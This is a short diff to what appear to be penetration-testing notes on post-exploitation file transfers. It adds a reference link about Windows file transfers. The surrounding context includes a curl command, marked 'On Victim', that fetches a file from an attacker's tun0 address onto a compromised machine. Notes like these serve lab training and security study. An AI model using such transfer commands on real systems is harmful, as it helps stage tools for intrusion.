@@ -96,7 +96,9 @@ On Victim:
 curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
 ```
 
+## References
 
+{% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}
 
 
 
